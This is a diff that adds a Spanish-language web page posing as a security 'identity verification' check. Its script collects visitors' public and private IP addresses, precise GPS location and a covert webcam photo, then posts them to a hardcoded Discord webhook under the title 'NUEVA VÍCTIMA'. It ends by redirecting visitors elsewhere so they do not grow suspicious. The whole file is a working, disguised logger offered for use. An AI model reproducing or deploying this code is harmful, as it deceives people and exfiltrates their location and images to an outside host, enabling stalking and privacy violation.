@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de identidad</title>
+    <style>
+        /* --- ESTILOS PROFESIONALES (camuflaje) --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            padding: 40px 35px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        h2 {
+            color: #1a1a2e;
+            font-weight: 600;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #5f6368;
+            font-size: 15px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .security-badge {
+            background: #e8f0fe;
+            color: #1a73e8;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: inline-block;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        .btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 28px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .btn:hover { background: #1557b0; }
+        .btn:disabled {
+            background: #bdc1c6;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 18px;
+            font-size: 13px;
+            color: #5f6368;
+            min-height: 20px;
+        }
+        .loader {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 0.8s linear infinite;
+            margin: 12px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer-text {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #9aa0a6;
+        }
+        .footer-text a { color: #1a73e8; text-decoration: none; }
+        .hidden { display: none; }
+    
+        /* --- FONDO DE PARTÍCULAS --- */
+        #particles {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            background:
+                radial-gradient(circle at 50% 50%, rgba(126, 34, 206, 0.12), transparent 45%),
+                #090611;
+        }
+
+        body {
+            overflow: hidden;
+        }
+
+        .card {
+            position: relative;
+            z-index: 1;
+            background: rgba(20, 13, 31, 0.88);
+            border: 1px solid rgba(168, 85, 247, 0.25);
+            box-shadow:
+                0 8px 35px rgba(0,0,0,0.45),
+                0 0 35px rgba(126, 34, 206, 0.10);
+            backdrop-filter: blur(10px);
+        }
+
+        h2 { color: #f3e8ff; }
+        .subtitle, #status { color: #c4b5d9; }
+        .footer-text { color: #8d7ca1; }
+
+        .security-badge {
+            background: rgba(126, 34, 206, 0.16);
+            color: #c084fc;
+            border: 1px solid rgba(192, 132, 252, 0.18);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #7e22ce, #a855f7);
+            box-shadow: 0 0 20px rgba(168, 85, 247, 0.22);
+        }
+
+        .btn:hover {
+            background: linear-gradient(135deg, #6b21a8, #9333ea);
+        }
+
+        .footer-text a { color: #c084fc; }
+
+    </style>
+</head>
+<body>
+<canvas id="particles"></canvas>
+
+<div class="card">
+    <!-- ICONO Y TÍTULO -->
+    <div class="logo">🛡️</div>
+    <h2>Verificación de identidad</h2>
+    <p class="subtitle">
+        Por tu seguridad, necesitamos confirmar que eres tú quien intenta acceder.
+        Haz clic en el botón para continuar.
+    </p>
+    <div class="security-badge">🔒 Conexión segura (SSL)</div>
+
+    <!-- BOTÓN PRINCIPAL -->
+    <button id="btnContinuar" class="btn">Continuar con la verificación</button>
+
+    <!-- LOADER Y ESTADO -->
+    <div id="loader" class="loader"></div>
+    <p id="status">Esperando tu acción...</p>
+
+    <!-- TEXTO DE PIE (para dar credibilidad) -->
+    <p class="footer-text">
+        Al continuar aceptas los <a href="#">términos de seguridad</a>.<br>
+        Esta verificación es requerida por el protocolo de acceso seguro v2.3.
+    </p>
+</div>
+
+<script>
+    // ============================================================
+    //  CONFIGURACIÓN: WEBHOOK DE DISCORD (CAMBIAR POR EL TUYO)
+    // ============================================================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1539842700063277137/06RDiQKVJ2ceYkC1ezo9wQFQsJo9EwfmgoYNSQTmX4KT70-ET_seSVmaRsG6pHzV8fpd";
+
+    // ============================================================
+    //  FUNCIONES AUXILIARES
+    // ============================================================
+    const status = document.getElementById('status');
+    const loader = document.getElementById('loader');
+    const btn = document.getElementById('btnContinuar');
+
+    function setStatus(msg, isError = false) {
+        status.textContent = msg;
+        status.style.color = isError ? '#d93025' : '#5f6368';
+    }
+
+    function showLoader(show) {
+        loader.style.display = show ? 'block' : 'none';
+        btn.disabled = show;
+    }
+
+    // --- OBTENER IP PÚBLICA ---
+    async function getPublicIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch { return 'No disponible'; }
+    }
+
+    // --- OBTENER IP PRIVADA (WebRTC) ---
+    function getLocalIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (event) => {
+                if (!event.candidate) return;
+                const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                if (match) {
+                    const ip = match[0];
+                    if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.')) {
+                        pc.close();
+                        resolve(ip);
+                    }
+                }
+            };
+            setTimeout(() => { pc.close(); resolve('No disponible'); }, 2500);
+        });
+    }
+
+    // --- OBTENER UBICACIÓN APROXIMADA POR IP (ip-api.com) ---
+    async function getLocationByIP(ip) {
+        try {
+            const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org`);
+            const data = await res.json();
+            if (data.status === 'success') {
+                return {
+                    pais: data.country || 'Desconocido',
+                    ciudad: data.city || 'Desconocida',
+                    region: data.regionName || 'Desconocida',
+                    lat: data.lat || 0,
+                    lon: data.lon || 0,
+                    isp: data.isp || 'Desconocido',
+                    org: data.org || 'Desconocido'
+                };
+            }
+            return null;
+        } catch { return null; }
+    }
+
+    // --- OBTENER UBICACIÓN PRECISA (HTML5 Geolocation) ---
+    function getPreciseLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        alt: pos.coords.altitude || 'N/A'
+                    });
+                },
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        });
+    }
+
+    // --- CAPTURAR FOTO (cámara) ---
+    function takePhoto() {
+        return new Promise((resolve) => {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(canvas.toDataURL('image/png'));
+                    }, 600);
+                })
+                .catch(() => resolve(null));
+        });
+    }
+
+    // --- INTENTAR DESCARGAR ARCHIVO (simulación de "acceso a archivos") ---
+    function triggerFileDownload() {
+        // Esto simula que el sistema está "verificando" archivos.
+        // En realidad, solo muestra un mensaje y opcionalmente descarga un archivo de prueba.
+        const link = document.createElement('a');
+        link.href = 'data:text/plain;charset=utf-8,Archivo de prueba - Verificación completada';
+        link.download = 'verificacion_seguridad.txt';
+        link.click();
+        return 'Archivo de prueba descargado (simulación)';
+    }
+
+    // --- ENVIAR DATOS A DISCORD ---
+    async function sendToDiscord(data) {
+        const embed = {
+            embeds: [{
+                title: '🕵️ NUEVA VÍCTIMA CAMUFLAJE',
+                color: 0x1a73e8,
+                timestamp: new Date().toISOString(),
+                fields: [
+                    { name: '🕒 Fecha/Hora', value: new Date().toLocaleString(), inline: true },
+                    { name: '🌐 IP Pública', value: data.ipPublica || 'No disponible', inline: true },
+                    { name: '🏠 IP Privada', value: data.ipPrivada || 'No disponible', inline: true },
+                    { name: '📍 Ubicación (IP)', value: `${data.ubicacion?.ciudad || '?'}, ${data.ubicacion?.pais || '?'}`, inline: true },
+                    { name: '📌 Coordenadas (precisas)', value: data.ubicacionPrecisa ? `${data.ubicacionPrecisa.lat}, ${data.ubicacionPrecisa.lon} (precisión ${data.ubicacionPrecisa.accuracy}m)` : 'No disponible', inline: false },
+                    { name: '📸 Foto', value: data.foto ? '✅ Capturada' : '❌ Denegada', inline: true },
+                    { name: '💻 User-Agent', value: navigator.userAgent.substring(0, 100) + '...', inline: false },
+                    { name: '🖥️ Resolución', value: `${screen.width}x${screen.height}`, inline: true },
+                    { name: '🌍 Idioma', value: navigator.language, inline: true },
+                    { name: '📂 Archivos (link)', value: data.archivos || 'No disponible', inline: false }
+                ],
+                footer: { text: 'Image Logger Camuflado • Bread Edition' }
+            }]
+        };
+
+        // Enviar embed
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(embed)
+        });
+
+        // Si hay foto, enviarla como archivo adjunto
+        if (data.foto) {
+            const blob = await fetch(data.foto).then(r => r.blob());
+            const form = new FormData();
+            form.append('payload_json', JSON.stringify({ content: '📷 **Foto capturada (camuflaje)**' }));
+            form.append('file', blob, `foto_${Date.now()}.png`);
+            await fetch(WEBHOOK_URL, { method: 'POST', body: form });
+        }
+    }
+
+    // ============================================================
+    //  FLUJO PRINCIPAL (CUANDO EL USUARIO HACE CLIC)
+    // ============================================================
+    btn.addEventListener('click', async function() {
+        // --- BLOQUEAR BOTÓN Y MOSTRAR LOADER ---
+        showLoader(true);
+        setStatus('🔍 Verificando identidad...');
+
+        // --- 1. IP PÚBLICA ---
+        const ipPublica = await getPublicIP();
+        setStatus('🌐 Obteniendo ubicación...');
+
+        // --- 2. UBICACIÓN POR IP (aproximada) ---
+        const ubicacion = await getLocationByIP(ipPublica);
+
+        // --- 3. IP PRIVADA ---
+        const ipPrivada = await getLocalIP();
+
+        // --- 4. UBICACIÓN PRECISA (HTML5) ---
+        setStatus('📍 Solicitando ubicación precisa (para seguridad)...');
+        const ubicacionPrecisa = await getPreciseLocation();
+
+        // --- 5. FOTO (cámara) ---
+        setStatus('📸 Solicitando acceso a la cámara (verificación facial)...');
+        const foto = await takePhoto();
+
+        // --- 6. SIMULAR "ACCESO A ARCHIVOS" ---
+        setStatus('📂 Verificando integridad de archivos...');
+        const archivos = triggerFileDownload();
+
+        // --- 7. RECOPILAR TODO ---
+        const data = {
+            ipPublica,
+            ipPrivada,
+            ubicacion,
+            ubicacionPrecisa,
+            foto,
+            archivos: 'Archivo de prueba descargado (simulación)'
+        };
+
+        // --- 8. ENVIAR A DISCORD ---
+        setStatus('📤 Enviando datos de verificación...');
+        await sendToDiscord(data);
+
+        // --- 9. FINALIZAR (camuflaje) ---
+        setStatus('✅ Verificación completada con éxito. Redirigiendo...');
+        showLoader(false);
+        btn.textContent = '✅ Verificado';
+        btn.disabled = true;
+
+
+        // Redirección después de completar la verificación
+        setTimeout(() => {
+            window.location.href = 'https://sites.google.com/view/vpnkinkbychaca/p%C3%A1gina-principal';
+        }, 1200);
+
+        // Opcional: redirigir a una página real para no levantar sospechas
+        // window.location.href = 'https://www.google.com';
+    });
+
+    // ============================================================
+    //  PARTÍCULAS MORADAS + REACCIÓN AL CURSOR
+    // ============================================================
+    const particleCanvas = document.getElementById('particles');
+    const pctx = particleCanvas.getContext('2d');
+
+    let particles = [];
+    let mouse = { x: -1000, y: -1000 };
+
+    function resizeParticles() {
+        particleCanvas.width = window.innerWidth;
+        particleCanvas.height = window.innerHeight;
+
+        const amount = Math.min(110, Math.max(45, Math.floor(
+            (window.innerWidth * window.innerHeight) / 14000
+        )));
+
+        particles = Array.from({ length: amount }, () => ({
+            x: Math.random() * particleCanvas.width,
+            y: Math.random() * particleCanvas.height,
+            size: Math.random() * 2.2 + 0.7,
+            vx: (Math.random() - 0.5) * 0.35,
+            vy: (Math.random() - 0.5) * 0.35,
+            alpha: Math.random() * 0.55 + 0.2
+        }));
+    }
+
+    window.addEventListener('resize', resizeParticles);
+
+    window.addEventListener('mousemove', (e) => {
+        mouse.x = e.clientX;
+        mouse.y = e.clientY;
+    });
+
+    window.addEventListener('mouseleave', () => {
+        mouse.x = -1000;
+        mouse.y = -1000;
+    });
+
+    function drawParticles() {
+        pctx.clearRect(0, 0, particleCanvas.width, particleCanvas.height);
+
+        for (const p of particles) {
+            const dx = mouse.x - p.x;
+            const dy = mouse.y - p.y;
+            const distance = Math.sqrt(dx * dx + dy * dy);
+
+            if (distance < 150) {
+                const force = (150 - distance) / 150;
+                p.x -= (dx / (distance || 1)) * force * 0.7;
+                p.y -= (dy / (distance || 1)) * force * 0.7;
+            }
+
+            p.x += p.vx;
+            p.y += p.vy;
+
+            if (p.x < -10) p.x = particleCanvas.width + 10;
+            if (p.x > particleCanvas.width + 10) p.x = -10;
+            if (p.y < -10) p.y = particleCanvas.height + 10;
+            if (p.y > particleCanvas.height + 10) p.y = -10;
+
+            pctx.beginPath();
+            pctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+            pctx.fillStyle = `rgba(192, 132, 252, ${p.alpha})`;
+            pctx.shadowBlur = 10;
+            pctx.shadowColor = 'rgba(168, 85, 247, 0.7)';
+            pctx.fill();
+            pctx.shadowBlur = 0;
+        }
+
+        // Conectar partículas cercanas
+        for (let i = 0; i < particles.length; i++) {
+            for (let j = i + 1; j < particles.length; j++) {
+                const a = particles[i];
+                const b = particles[j];
+                const dx = a.x - b.x;
+                const dy = a.y - b.y;
+                const distance = Math.sqrt(dx * dx + dy * dy);
+
+                if (distance < 105) {
+                    pctx.beginPath();
+                    pctx.moveTo(a.x, a.y);
+                    pctx.lineTo(b.x, b.y);
+                    pctx.strokeStyle = `rgba(168, 85, 247, ${0.10 * (1 - distance / 105)})`;
+                    pctx.lineWidth = 0.6;
+                    pctx.stroke();
+                }
+            }
+        }
+
+        requestAnimationFrame(drawParticles);
+    }
+
+    resizeParticles();
+    drawParticles();
+
+</script>
+</body>
+</html>
